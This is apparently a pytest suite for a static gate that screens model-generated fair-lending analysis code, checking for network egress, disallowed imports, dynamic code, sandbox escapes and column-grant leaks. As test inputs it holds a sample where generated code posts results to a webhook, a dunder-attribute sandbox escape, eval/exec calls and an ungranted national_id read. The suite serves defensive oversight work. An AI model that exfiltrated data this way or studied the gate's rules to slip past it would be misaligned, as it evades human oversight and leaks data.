"""Tests for the static code gate (docs/features/governed-codegen.md section 5).

The gate is the v1 centerpiece. The headline test is the done-when: a generated
webhook call is caught as CTL-EGRESS-01 and never passes. Alongside it, the
false-block guard: realistic benign fair-lending code must pass, because a gate
that refuses good work gets routed around (section 16).
"""

from __future__ import annotations

import textwrap

from sentinel.codegen.gate import (
    CLEARED,
    NO_SUBJECT,
    NOT_ARMED,
    REFUSED,
    gate_code,
)


def _dedent(code: str) -> str:
    return textwrap.dedent(code).strip("\n") + "\n"


# -- the done-when ---------------------------------------------------------
def test_generated_webhook_is_blocked_as_egress():
    # The exact shape from section 1.4: the model appends a webhook exfiltration
    # to an otherwise-fine fairlearn analysis. `requests` is referenced with no
    # import, so the gate catches the bare name.
    code = _dedent(
        """
        import fairlearn.metrics as flm
        df = ctx.table("german_credit")
        mf = flm.MetricFrame(
            metrics=flm.selection_rate,
            y_true=df.y, y_pred=df.pred,
            sensitive_features=df.age_band)
        requests.post(WEBHOOK, json=mf.by_group.to_dict())
        """
    )
    result = gate_code(code)
    assert not result.passed
    assert "CTL-EGRESS-01" in result.controls_fired
    egress = [v for v in result.violations if v.control == "CTL-EGRESS-01"]
    assert egress and egress[0].detail == "requests"
    # It fires on the webhook line, not the import line (there is no import).
    assert egress[0].line == code.count("\n", 0, code.index("requests.post")) + 1
    # The refusal names the control and the line in a reviewer-readable sentence.
    assert "CTL-EGRESS-01" in result.refusal_summary()
    assert "network egress" in result.refusal_summary()


def test_imported_network_module_is_blocked_as_egress():
    result = gate_code("import requests\nrequests.get('http://x')\n")
    assert not result.passed
    assert result.controls_fired == ["CTL-EGRESS-01"]


# -- the false-block guard -------------------------------------------------
def test_benign_fair_lending_code_passes():
    code = _dedent(
        """
        import fairlearn.metrics as flm
        import pandas as pd
        import numpy as np
        from sklearn.linear_model import LogisticRegression
        df = ctx.table("german_credit")
        mf = flm.MetricFrame(
            metrics=flm.selection_rate,
            y_true=df.y, y_pred=df.pred,
            sensitive_features=df.age_band)
        rates = mf.by_group.to_dict()
        ctx.emit({"selection_rate_by_band": rates})
        """
    )
    result = gate_code(code, granted_columns=["age_band", "income", "y", "pred"])
    assert result.passed, result.refusal_summary()
    assert result.violations == []


# -- import allowlist (CTL-CODE-01) ----------------------------------------
def test_allowlisted_submodule_imports_pass():
    for line in (
        "import pandas as pd",
        "import numpy",
        "import scipy.stats as st",
        "import statsmodels.api as sm",
        "from sklearn.metrics import roc_auc_score",
        "from fairlearn.reductions import ExponentiatedGradient",
    ):
        result = gate_code(line + "\n")
        assert result.passed, f"{line!r} -> {result.refusal_summary()}"


def test_non_allowlisted_import_is_blocked():
    result = gate_code("import yaml\n")
    assert not result.passed
    assert result.controls_fired == ["CTL-CODE-01"]


def test_bare_parent_of_allowlisted_submodule_is_blocked():
    # Only scipy.stats is granted, not scipy. `import scipy` reaches everything.
    result = gate_code("import scipy\n")
    assert not result.passed
    assert result.controls_fired == ["CTL-CODE-01"]


# -- filesystem / process (CTL-CODE-02) ------------------------------------
def test_filesystem_module_is_blocked():
    assert gate_code("import os\n").controls_fired == ["CTL-CODE-02"]
    assert gate_code("import subprocess\n").controls_fired == ["CTL-CODE-02"]


def test_open_in_write_mode_is_blocked_read_mode_ok():
    assert not gate_code("open('/tmp/x', 'w').write('h')\n").passed
    assert gate_code("open('/tmp/x', 'w')\n").controls_fired == ["CTL-CODE-02"]
    # Read-mode open is not a CTL-CODE-02 violation by itself.
    assert gate_code("open('data.csv')\n").passed
    assert gate_code("open('data.csv', 'r')\n").passed


# -- dynamic code (CTL-CODE-03) --------------------------------------------
def test_eval_exec_compile_are_blocked():
    for call in ("eval('1+1')", "exec('x=1')", "compile('x', '<s>', 'exec')"):
        assert gate_code(call + "\n").controls_fired == ["CTL-CODE-03"]


def test_importlib_and_pickle_are_blocked():
    assert gate_code("import importlib\n").controls_fired == ["CTL-CODE-03"]
    assert gate_code("import pickle\n").controls_fired == ["CTL-CODE-03"]


# -- dunder escape (CTL-CODE-04) -------------------------------------------
def test_dunder_escape_attribute_is_blocked():
    result = gate_code("cls = ().__class__.__bases__[0].__subclasses__()\n")
    assert not result.passed
    assert result.controls_fired == ["CTL-CODE-04"]


# -- column grant (CTL-COL-01) ---------------------------------------------
def test_ungranted_column_subscript_is_blocked():
    code = _dedent(
        """
        df = ctx.table("german_credit")
        leak = df["national_id"]
        ctx.emit(leak)
        """
    )
    result = gate_code(code, granted_columns=["age_band", "income", "y", "pred"])
    assert not result.passed
    assert result.controls_fired == ["CTL-COL-01"]
    assert result.violations[0].detail == 'df["national_id"]'


def test_granted_column_subscript_passes():
    code = _dedent(
        """
        df = ctx.table("german_credit")
        band = df["age_band"]
        ctx.emit(band)
        """
    )
    result = gate_code(code, granted_columns=["age_band", "income", "y", "pred"])
    assert result.passed, result.refusal_summary()


def test_column_check_skipped_when_no_grant_given():
    # Without a grant in scope, CTL-COL-01 cannot judge and must not fire.
    code = 'df = ctx.table("german_credit")\nx = df["anything"]\n'
    assert gate_code(code).passed


# -- parse failure (CTL-CODE-00) -------------------------------------------
def test_unparseable_code_is_refused():
    result = gate_code("def (:\n")
    assert not result.passed
    assert result.controls_fired == ["CTL-CODE-00"]


# -- multiple violations, stable order -------------------------------------
def test_multiple_violations_are_reported_in_source_order():
    code = _dedent(
        """
        import os
        requests.post(url)
        eval(payload)
        """
    )
    result = gate_code(code)
    assert not result.passed
    controls = [v.control for v in result.violations]
    assert controls == ["CTL-CODE-02", "CTL-EGRESS-01", "CTL-CODE-03"]
    lines = [v.line for v in result.violations]
    assert lines == sorted(lines)


# -- the read: what the gate examined, not only what it refused -------------
# A gate that records only refusals can say nothing about the run it cleared,
# which left the Gate screen printing nine identical ticks over nine unequal
# checks. These pin the evidence a passing verdict now has to carry.
def test_a_passing_gate_records_what_it_judged():
    code = _dedent(
        """
        import fairlearn.metrics as flm
        df = ctx.table("german_credit")
        ctx.emit(df["age_band"])
        """
    )
    result = gate_code(code, granted_columns=["age_band", "y"], allowed_tables=["german_credit"])
    assert result.passed
    assert result.examined > 0, "a clear verdict with nothing examined is a tick, not evidence"
    imports = result.check("imports")
    assert imports.verdict == CLEARED
    assert [o.subject for o in imports.items] == ["import fairlearn.metrics"]
    assert all(o.allowed for o in imports.items)
    columns = result.check("columns")
    assert [o.subject for o in columns.items] == ['df["age_band"]']
    assert columns.rule == "the column grant for this purpose (2 columns)"


def test_a_check_with_nothing_to_read_is_not_a_check_that_cleared():
    # Three different facts, three different verdicts. Collapsing them is how a
    # gate screen starts claiming assurance nobody established.
    result = gate_code(
        'df = ctx.table("german_credit")\nctx.emit(df)\n',
        granted_columns=["age_band"],
        allowed_tables=["german_credit"],
    )
    assert result.passed
    # No ctx.sql, so the two SQL checks had no subject at all.
    assert result.check("tables").verdict == NO_SUBJECT
    assert result.check("joins").verdict == NO_SUBJECT
    assert result.check("escape").verdict == CLEARED  # attributes were read
    # And with no grant supplied, the column check cannot run at all.
    inert = gate_code('df = ctx.table("t")\nx = df["anything"]\n')
    assert inert.check("columns").verdict == NOT_ARMED


def test_a_refusal_lands_in_the_check_that_made_it():
    code = 'import fairlearn.metrics as flm\nrequests.post("https://x/y", json={})\n'
    result = gate_code(code, granted_columns=["y"])
    assert not result.passed
    egress = result.check("egress")
    assert egress.verdict == REFUSED
    assert [o.subject for o in egress.refusals] == ["requests"]
    assert egress.refusals[0].line == 2
    # Every other check still reports its own read rather than going dark.
    assert result.check("imports").verdict == CLEARED
    assert result.check("dyncode").verdict == CLEARED


def test_sql_reading_feeds_the_column_table_and_join_checks():
    code = _dedent(
        """
        df = ctx.sql("SELECT age_band, AVG(pred) AS r FROM german_credit GROUP BY age_band")
        ctx.emit(df)
        """
    )
    result = gate_code(
        code, granted_columns=["age_band", "pred"], allowed_tables=["german_credit"]
    )
    assert result.passed
    assert [o.subject for o in result.check("tables").items] == ["german_credit (SQL)"]
    assert result.check("columns").examined == 3  # age_band twice, pred once
    joins = result.check("joins")
    assert joins.verdict == CLEARED and joins.items[0].subject == "0 joins"


def test_select_star_is_refused_by_name_in_the_column_check():
    result = gate_code(
        'ctx.emit(ctx.sql("SELECT * FROM german_credit"))\n',
        granted_columns=["age_band"],
        allowed_tables=["german_credit"],
    )
    assert not result.passed
    assert [o.subject for o in result.check("columns").refusals] == ["SELECT *"]


def test_a_cartesian_join_refuses_even_under_the_ceiling():
    # One join is inside a ceiling of two, so the ceiling alone would clear it.
    # The check must still refuse an unconditioned join, and say which it was.
    result = gate_code(
        'ctx.emit(ctx.sql("SELECT a.age_band FROM german_credit a, german_credit b"))\n',
        granted_columns=["age_band"],
        allowed_tables=["german_credit"],
    )
    assert not result.passed
    joins = result.check("joins")
    assert joins.verdict == REFUSED
    assert "neither ON nor USING" in joins.refusals[0].reason


def test_unparsed_code_leaves_every_other_check_unarmed():
    # Eight green ticks on code that will not compile would be a straight
    # falsehood: the walk needs a tree and never ran.
    result = gate_code("def broken(:\n", granted_columns=["y"], allowed_tables=["t"])
    assert not result.passed
    assert result.check("parse").verdict == REFUSED
    assert all(c.verdict == NOT_ARMED for c in result.checks if c.key != "parse")


def test_line_counts_cover_the_lines_that_hold_constructs():
    code = 'import pandas\n\nctx.emit(1)\n'
    counts = gate_code(code).scope["line_counts"]
    assert counts[1] == 1  # the import
    assert 2 not in counts  # a blank line holds nothing to judge
    assert counts[3] >= 1


def test_public_payload_carries_the_read_alongside_the_pinned_keys():
    result = gate_code('import pandas\nctx.emit(1)\n')
    pub = result.to_public_dict()
    assert set(pub) >= {"passed", "controls_fired", "violations", "checks", "scope"}
    assert len(pub["checks"]) == 9
    first = pub["checks"][0]
    assert set(first) >= {"key", "label", "controls", "rule", "verdict", "summary", "items"}
    assert pub["scope"]["tier"] == "L2"
